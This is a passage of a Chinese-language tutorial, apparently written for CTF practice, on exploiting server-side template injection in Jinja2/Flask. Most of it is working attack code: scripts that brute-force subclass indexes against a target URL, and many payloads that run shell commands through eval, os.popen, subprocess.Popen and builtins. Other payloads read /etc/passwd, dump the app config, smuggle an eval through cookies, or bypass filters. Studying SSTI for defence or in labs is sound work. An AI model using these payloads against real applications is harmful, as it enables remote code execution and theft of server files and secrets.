        url='http://127.0.0.1:5000?name='
        r = requests.post(url+payload)
        if "catch_warnings" in r.text:
            print(r.text)
            print(i)
            break
#### Python3方法：
##### 寻找内建函数 eval：
首先编写脚本遍历目标Python环境中含有内建函数 eval 的子类的索引号：
    import requests
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Safari/537.36'
    }
    for i in range(500):
        url = "http://47.xxx.xxx.72:8000/?name={{().__class__.__bases__[0].__subclasses__()["+str(i)+"].__init__.__globals__['__builtins__']}}"
        res = requests.get(url=url, headers=headers)
        if 'eval' in res.text:
            print(i)
  *     我们可以记下几个含有eval函数的类：
    - warnings.catch_warnings
    - WarningMessage
    - codecs.IncrementalEncoder
    - codecs.IncrementalDecoder
    - codecs.StreamReaderWriter
    - os._wrap_close
    - reprlib.Repr
    - weakref.finalize
    payload如下：
    {{''.__class__.__bases__[0].__subclasses__()[166].__init__.__globals__['__builtins__']['eval']('__import__("os").popen("ls /").read()')}}
我们可以看到，使用eval函数执行命令也是调用的os模块，那我们直接调用os模块不是更简单？
##### 寻找 os 模块：
Python的 os
模块中有system和popen这两个函数可用来执行命令。其中system()函数执行命令是没有回显的，我们可以使用system()函数配合curl外带数据；popen()函数执行命令有回显。所以比较常用的函数为popen()函数，而当popen()函数被过滤掉时，可以使用system()函数代替。
首先编写脚本遍历目标Python环境中含有os模块的类的索引号：
    import requests
    headers = {
        'User-Agent': 'User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0'
    }
    for i in range(500):
        url = "http://127.0.0.1:5000/?name={{().__class__.__bases__[0].__subclasses__()["+str(i)+"].__init__.__globals__}}"
        res = requests.get(url=url, headers=headers)
        if 'os.py' in res.text:
            print(i)
随便挑一个类构造payload执行命令即可：
    {{''.__class__.__bases__[0].__subclasses__()[79].__init__.__globals__['os'].popen('ls /').read()}}
  * 但是该方法遍历得到的类不准确，因为一些不相关的类名中也存在字符串 “os”，所以我们还要探索更有效的方法。
  * 我们可以看到，即使是使用os模块执行命令，其也是调用的os模块中的popen函数，那我们也可以直接调用popen函数，存在popen函数的类一般是 `os._wrap_close`，但也不绝对。由于目标Python环境的不同，我们还需要遍历一下。
##### 寻找 popen 函数：
首先编写脚本遍历目标Python环境中含有 popen 函数的类的索引号：
    import requests
    headers = {
        'User-Agent': 'User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0'
    }
    for i in range(500):
        url = "http://127.0.0.1:5000/?name={{().__class__.__bases__[0].__subclasses__()["+str(i)+"].__init__.__globals__}}"
        res = requests.get(url=url, headers=headers)
        if 'popen' in res.text:
            print(i)
直接构造payload即可：
    {{''.__class__.__bases__[0].__subclasses__()[117].__init__.__globals__['popen']('ls /').read()}}
这样得到的索引还是很准确的。除了这种方法外，我们还可以直接导入os模块，python有一个importlib类，可用load_module来导入你需要的模块。
##### 寻找 importlib 类：
Python 中存在 `` 类，目的就是提供 Python 中
import 语句的实现（以及 `__import__` 函数）。我么可以直接利用该类中的load_module将os模块导入，从而使用 os
模块执行命令。
首先编写脚本遍历目标Python环境中 importlib 类的索引号：
    iimport requests
    headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0'
    }
    for i in range(500):
        url = "http://127.0.0.1:5000/?name={{().__class__.__bases__[0].__subclasses__()["+str(i)+"]}}"
        res = requests.get(url=url, headers=headers)
        if '_frozen_importlib.BuiltinImporter' in res.text:
            print(i)
    # 得到编号为84
构造如下payload即可执行命令：
    {{[].__class__.__base__.__subclasses__()[84]["load_module"]("os")["popen"]("ls /").read()}}
#### Python2方法：
==注意：python2的`string`类型（引号）不直接从属于属于基类，所以要用两次 `__bases__[0]`==
##### `file`类读写文件：
  * 本方法只能适用于python2，因为在python3中`file`类已经被移除了
  * 可以使用dir查看file对象中的内置方法
    >>> dir(().__class__.__bases__[0].__subclasses__()[40])
    ['__class__', '__delattr__', '__doc__', '__enter__', '__exit__', '__format__', '__getattribute__', '__hash__', '__init__', '__iter__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__', 'close', 'closed', 'encoding', 'errors', 'fileno', 'flush', 'isatty', 'mode', 'name', 'newlines', 'next', 'read', 'readinto', 'readline', 'readlines', 'seek', 'softspace', 'tell', 'truncate', 'write', 'writelines', 'xreadlines']
    读文件
    {{().__class__.__bases__[0].__subclasses__()[40]('/etc/passwd').read()}}
    {{().__class__.__bases__[0].__subclasses__()[40]('/etc/passwd').readlines()}}
##### 寻找 linecache 函数：
  * linecache 这个函数可用于读取任意一个文件的某一行，而这个函数中也引入了 os 模块，所以我们也可以利用这个 linecache 函数去执行命令。
  * 首先编写脚本遍历目标Python环境中含有 linecache 这个函数的子类的索引号：
    import requests
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0'
    }
    for i in range(500):
        url = "http://127.0.0.1:5000/?name={{().__class__.__bases__[0].__subclasses__()["+str(i)+"].__init__.__globals__}}"
        res = requests.get(url=url, headers=headers)
        if 'linecache' in res.text:
            print(i)
随便挑一个子类构造payload即可：
    {{[].__class__.__base__.__subclasses__()[168].__init__.__globals__['linecache']['os'].popen('ls /').read()}}
    {{[].__class__.__base__.__subclasses__()[168].__init__.__globals__.linecache.os.popen('ls /').read()}}
    payload如下：
    {{[].__class__.__base__.__subclasses__()[60].__init__.func_globals['linecache'].os.popen('whoami').read()}}
    - 本方法只能用于python2，因为在python3中会报错`'function object' has no attribute 'func_globals'`
#### python2&3的方法:
##### `__builtins__`：
  * 首先`__builtins__`是一个包含了大量内置函数的一个模块，我们平时用python的时候之所以可以直接使用一些函数比如abs，max，就是因为1 **builtins** 1这类模块在Python启动时为我们导入了，可以使用dir(`__builtins__`)来查看调用方法的列表，然后可以发现`__builtins__`下有eval，`__import__`等的函数，因此可以利用此来执行命令。
  * 再调用eval等函数和方法即可
    {{().__class__.__bases__[0].__subclasses__()[140].__init__.__globals__['__builtins__']['eval']("__import__('os').system('whoami')")}}
    {{().__class__.__bases__[0].__subclasses__()[140].__init__.__globals__['__builtins__']['eval']("__import__('os').popen('whoami').read()")}}
    {{().__class__.__bases__[0].__subclasses__()[140].__init__.__globals__['__builtins__']['__import__']('os').popen('whoami').read()}}
    {{().__class__.__bases__[0].__subclasses__()[140].__init__.__globals__['__builtins__']['open']('/etc/passwd').read()}}
    {{x.__init__.__globals__['__builtins__']}}
    这里的x任意26个英文字母的任意组合都可以，同样可以得到__builtins__然后用eval就可以了
    {{(abc|attr(request.cookies.a)|attr(request.cookies.b)|attr(request.cookies.c))(request.cookies.d).eval(request.cookies.e)}}
    Cookie:a=__init__;b=__globals__;c=__getitem__;d=__builtins__;e=__import__('os').popen('cat /flag').read()
或者用如下两种方式，用模板来跑循环
    循环一：
    {% for c in ().__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('whoami').read()") }}{% endif %}{% endfor %}
    循环二：
    {% for c in [].__class__.__base__.__subclasses__() %}
    {% if c.__name__ == 'catch_warnings' %}
      {% for b in c.__init__.__globals__.values() %}
        {% if b.__class__ == {}.__class__ %}
            {% if 'eval' in b.keys() %}
            {{ b['eval']('__import__("os").popen("whoami").read()') }}
            {% endif %}
        {% endif %}
        {% endfor %}
    {% endif %}
    {% endfor %}
读取文件：
    {% for c in ().__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].open('filename', 'r').read() }}{% endif %}{% endfor %}
==注==：warnings.catch_warnings类在在内部定义了`_module=sys.modules['warnings']`，然后`warnings`模块包含有`__builtins__`，也就是说如果可以找到warnings.catch_warnings类，则可以不使用globals，payload如下：
    {{''.__class__.__mro__[1].__subclasses__()[40]()._module.__builtins__['__import__']("os").popen('whoami').read()}}
##### 寻找 subprocess.Popen 类：
从python2.4版本开始，可以用 subprocess 这个模块来产生子进程，并连接到子进程的标准输入/输出/错误中去，还可以得到子进程的返回值。
subprocess 意在替代其他几个老的模块或者函数，比如：`os.system`、`os.popen` 等函数。
首先编写脚本遍历目标Python环境中含有 linecache 这个函数的子类的索引号：
    import requests
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Safari/537.36'
    }
    for i in range(500):
        url = "http://47.xxx.xxx.72:8000/?name={{().__class__.__bases__[0].__subclasses__()["+str(i)+"]}}"
        res = requests.get(url=url, headers=headers)
        if 'linecache' in res.text:
            print(i)
    # 得到索引为245
则构造如下payload执行命令即可：
    {{[].__class__.__base__.__subclasses__()[245]('ls /',shell=True,stdout=-1).communicate()[0].strip()}}
    # {{[].__class__.__base__.__subclasses__()[245]('要执行的命令',shell=True,stdout=-1).communicate()[0].strip()}}
我们可以用`find2.py`寻找`subprocess.Popen`这个类，可以直接RCE
    {{''.__class__.__mro__[2].__subclasses__()[258]('whoami',shell=True,stdout=-1).communicate()[0].strip()}}
### 获取配置信息：
我们有时候可以使用flask的内置函数比如说url_for，get_flashed_messages，甚至是内置的对象request来查询配置信息或者是构造payload
#### config：
我们通常会用{{config}}查询配置信息，如果题目有设置类似app.config ['FLAG'] =
os.environ.pop('FLAG')，就可以直接访问{{config['FLAG']}}或者{{config.FLAG}}获得flag
#### request：
    jinja2中存在对象request
    >>>from flask import Flask,request,render_template_string
    >>>request.__class__.__mro__[1]
    查询一些配置信息{{request.application.__self__._get_data_for_json.__globals__['json'].JSONEncoder.default.__globals__['current_app'].config}}
    构造ssti的payload:
    {{request.__init__.__globals__['__builtins__'].open('/etc/passwd').read()}}
    {{request.application.__globals__['__builtins__'].open('/etc/passwd').read()}}
#### url_for:
    查询配置信息
    {{url_for.__globals__['current_app'].config}}
    构造ssti的payload
    {{url_for.__globals__['__builtins__']['eval']("__import__('os').popen('whoami').read()")}}
如果使用常规 Payload 比如`__subclasses__ 或 __class`__，肯定会导致 Payload 过长。
因此我们要在这里使用 Flask 内置的全局函数来构造我们的 Payload：
    url_for：此函数全局空间下存在 eval() 和 os 模块
    lipsum：此函数全局空间下存在 eval() 和 os 模块
所以我们可以使用`__globals__`属性来获取函数当前全局空间下的所有模块、函数及属性
下列 Payload 即通过`__globals__` 属性获取全局空间中的 os 模块，并调用 popen() 函数来执行系统命令；因为 popen
函数返回的结果是个文件对象，因此需要调用 read() 函数来获取执行结果。
    {{url_for.__globals__.os.popen('whoami').read()}}
    {{lipsum.__globals__.os.popen('whoami').read()}}
#### get_flashed_messages:
    查询配置信息
    {{get_flashed_messages.__globals__['current_app'].config}}
    构造ssti的payload
    {{get_flashed_messages.__globals__['__builtins__'].eval("__import__('os').popen('whoami').read()")}}
### 过滤bypass：
#### 过滤点：
    在python中，可用以下表示法可用于访问对象的属性
    {{().__class__}}
    {{()["__class__"]}}
    {{()|attr("__class__")}}
    {{getattr('',"__class__")}}
    也就是说我们可以通过`[]`，`attr()`，`getattr()`来绕过点
##### [ ]绕过：
使用访问字典的方式来访问函数或者类等，下面两行是等价的
    {{().__class__}}
    {{()['__class__']}}